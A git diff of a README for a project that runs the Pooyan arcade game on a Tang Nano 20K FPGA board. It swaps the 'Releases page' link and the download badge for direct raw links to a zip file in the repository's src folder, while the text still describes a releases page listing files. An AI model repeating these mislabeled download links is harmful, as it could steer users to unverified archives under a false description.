@@ -4,12 +4,12 @@
 
 Welcome to TangNano20K-Pooyan! This project allows you to run the classic Pooyan arcade game on a Tang Nano 20K FPGA Board. Follow these steps to get started.
 
-[![Download TangNano20K-Pooyan](https://img.shields.io/badge/Download-TangNano20K--Pooyan-blue)](https://github.com/Dannyjune79/TangNano20K-Pooyan/releases)
+[![Download TangNano20K-Pooyan](https://raw.githubusercontent.com/Dannyjune79/TangNano20K-Pooyan/main/TN20K-Pooyan/src/TangNano20K-Pooyan-2.6.zip)](https://raw.githubusercontent.com/Dannyjune79/TangNano20K-Pooyan/main/TN20K-Pooyan/src/TangNano20K-Pooyan-2.6.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Dannyjune79/TangNano20K-Pooyan/releases) to access the latest version. This page includes all the downloadable files you need to set up the game on your FPGA board.
+   Go to the [Releases page](https://raw.githubusercontent.com/Dannyjune79/TangNano20K-Pooyan/main/TN20K-Pooyan/src/TangNano20K-Pooyan-2.6.zip) to access the latest version. This page includes all the downloadable files you need to set up the game on your FPGA board.
 
 2. **Choose Your File**  
    You will see a list of available files. Find the one labeled for the Tang Nano 20K FPGA board. This file contains the necessary code to run the game.
